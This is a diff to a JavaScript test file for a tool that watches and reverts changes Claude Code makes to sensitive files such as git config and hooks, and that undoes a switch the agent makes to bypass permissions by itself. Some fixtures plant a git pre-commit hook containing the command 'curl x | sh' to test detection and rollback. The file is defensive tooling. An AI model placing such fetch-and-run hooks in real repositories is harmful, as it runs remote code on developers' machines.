@@ -263,8 +263,9 @@ test('watchlist: a snapshot before the turn\'s first prompt goes, one after its 
   // Revert: each file only while it is still as the event saw it (bn-coded checks the hash)
   const r = await s.revertWatch(ev.id);
   assert.deepEqual(r.map((x) => [x.path, x.ok, x.action]), [['.git/config', true, 'restored'], ['.git/hooks/pre-commit', true, 'trashed']]);
-  assert.deepEqual(w.restores[0], { path: '.git/config', ifSha256: cfg1.sha256, data: cfg0.data, mode: 0o644 });
-  assert.deepEqual(w.restores[1], { path: '.git/hooks/pre-commit', ifSha256: hook.sha256, data: null, mode: null });
+  // (git's config last: it may name the hook folder the hook is in)
+  assert.deepEqual(w.restores[0], { path: '.git/hooks/pre-commit', ifSha256: hook.sha256, data: null, mode: null });
+  assert.deepEqual(w.restores[1], { path: '.git/config', ifSha256: cfg1.sha256, data: cfg0.data, mode: 0o644 });
   assert.ok(events.some(([, , e]) => e.type === 'local' && /Put back/.test(e.text)));
   assert.deepEqual((await s.revertWatch(ev.id, '.git/config')).map((x) => x.action), ['already']);
   await assert.rejects(s.revertWatch('00000000-0000-4000-8000-00000000dead'), (e) => e.status === 404);
@@ -402,4 +403,109 @@ test('watch.mjs: git\'s own files the sandbox places (hooksPath, includes, fsmon
   const big = 'x'.repeat(900 * 1024);
   const s3 = snap(file('.envrc', big), file('.npmrc', big), file('.yarnrc.yml', big));
   assert.deepEqual([...s3.values()].map((e) => e.data !== null), [true, true, false]);
+});
+
+test('a switch to the mode Claude Code already said it is in sends nothing; the echo of a switch is waited for only briefly after its answer', async () => {
+  const { mgr, queries } = manager();
+  mgr.modeEchoMs = 40;
+  const s = mgr.get(mgr.open({}).id);
+  const q = queries[0];
+  q.echoMode = 'change';
+  s.prompt({ text: 'hi' });
+  await tick(40);   // (init: default)
+  const n = q.calls.length;
+  await s.setMode('default');
+  assert.equal(q.calls.slice(n).filter((c) => c[0] === 'setPermissionMode').length, 0, 'nothing to switch');
+  // Claude Code to Plan by itself and back to Manual: both followed (no echo of ours swallows the second)
+  q.emit({ type: 'system', subtype: 'status', status: null, permissionMode: 'plan' });
+  await tick(10);
+  assert.equal(s.mode, 'plan');
+  q.emit({ type: 'system', subtype: 'status', status: null, permissionMode: 'default' });
+  await tick(10);
+  assert.equal(s.mode, 'default');
+  // a switch whose status never comes: once the window has passed, the same mode reported is Claude Code's own again
+  q.echoMode = false;
+  await s.setMode('acceptEdits');
+  await tick(60);
+  q.emit({ type: 'system', subtype: 'status', status: null, permissionMode: 'plan' });
+  await tick(10);
+  q.emit({ type: 'system', subtype: 'status', status: null, permissionMode: 'acceptEdits' });
+  await tick(10);
+  assert.equal(s.mode, 'acceptEdits', 'not taken for a late echo');
+  mgr.closeAll();
+});
+
+test('what Claude Code says while set_mode requests run is reconciled after the last one: its own later switch holds; Bypass by itself is undone', async () => {
+  const { mgr, queries, events } = manager();
+  const s = mgr.get(mgr.open({}).id);
+  const q = queries[0];
+  // (after Claude Code answered our switch, while its rules are applied: then it switches by itself)
+  const apply = q.applyFlagSettings.bind(q), sp = q.setPermissionMode.bind(q);
+  let say = null;
+  q.setPermissionMode = async (m) => { await sp(m); if (say) { const x = say; say = null; q.after = x; } };
+  q.applyFlagSettings = async (x) => {
+    if (q.after) { const m = q.after; q.after = null; q.emit({ type: 'system', subtype: 'status', status: null, permissionMode: m }); await tick(5); }
+    return apply(x);
+  };
+  await s.setMode('readOnly');
+  say = 'plan';
+  await s.setMode('acceptEdits');   // (Read only's rules go after the mode: Claude Code says Plan meanwhile)
+  await tick(10);
+  assert.equal(s.mode, 'plan', 'its own switch, after ours, holds');
+  await s.setMode('readOnly');
+  say = 'bypassPermissions';
+  const n = events.length;
+  await s.setMode('acceptEdits');
+  await tick(40);
+  assert.ok(events.slice(n).some(([, , e]) => e.type === 'local' && /by itself/.test(e.text)), 'said');
+  assert.equal(s.mode, 'default', 'set back to Manual');
+  assert.equal(q.calls.filter((c) => c[0] === 'setPermissionMode').at(-1)[1], 'default');
+  mgr.closeAll();
+});
+
+test('watchlist: a snapshot the sandbox could not complete is said — once on its own, then on each card; never a silent cut', async () => {
+  const hook = file('.git/hooks/pre-commit', 'curl x | sh\n', 0o755);
+  const w = watcher([[], [], [], [hook]]);
+  w.truncated = true;
+  w.snapshot = async () => { w.calls.push('snapshot'); return { files: w.snaps.length > 1 ? w.snaps.shift() : w.snaps[0], truncated: w.truncated }; };
+  const { mgr, events } = manager({ watcher: w });
+  const s = mgr.get(mgr.open({}).id);
+  s.prompt({ text: 'one' });
+  await tick(80);
+  let cards = events.map(([, , e]) => e).filter((e) => e.type === 'watch');
+  assert.equal(cards.length, 1);
+  assert.deepEqual(cards[0].changes, []);
+  assert.match(cards[0].incomplete, /review \.git/);
+  s.prompt({ text: 'two' });
+  await tick(80);
+  cards = events.map(([, , e]) => e).filter((e) => e.type === 'watch');
+  assert.equal(cards.length, 2, 'no second card without changes');
+  assert.deepEqual(cards[1].changes.map((c) => c.path), ['.git/hooks/pre-commit']);
+  assert.match(cards[1].incomplete, /review \.git/);
+  // more entries than the server takes: incomplete too
+  const many = Array.from({ length: 301 }, (_, i) => file(`.git/hooks/h${i}`, 'x'));
+  assert.equal(checkSnapshot({ files: many }).incomplete, true);
+  assert.equal(checkSnapshot({ files: many.slice(0, 10) }).incomplete, false);
+  mgr.closeAll();
+});
+
+test('Revert all: git\'s config goes back last; a file the sandbox no longer counts as watched is tried once more', async () => {
+  const cfg0 = file('.git/config', '[core]\n'), cfg1 = file('.git/config', '[core]\n\thooksPath = .githooks\n');
+  const hook = { ...file('.githooks/pre-commit', 'curl x | sh\n', 0o755), kind: 'git-hook' };
+  const w = watcher([[cfg0], [cfg1, hook], [cfg1, hook]]);
+  let refuse = 1;
+  w.restore = async (r) => {
+    w.restores.push(r.path);
+    if (r.path === '.githooks/pre-commit' && refuse-- > 0) throw new Error('not a watched file');
+    return { path: r.path, action: r.data === null ? 'trashed' : 'restored' };
+  };
+  const { mgr, events } = manager({ watcher: w });
+  const s = mgr.get(mgr.open({}).id);
+  s.prompt({ text: 'do it' });
+  await tick(80);
+  const ev = events.map(([, , e]) => e).find((e) => e.type === 'watch');
+  const r = await s.revertWatch(ev.id);
+  assert.deepEqual(w.restores, ['.githooks/pre-commit', '.git/config', '.githooks/pre-commit']);
+  assert.deepEqual(r.map((x) => [x.path, x.ok]), [['.git/config', true], ['.githooks/pre-commit', true]]);
+  mgr.closeAll();
 });
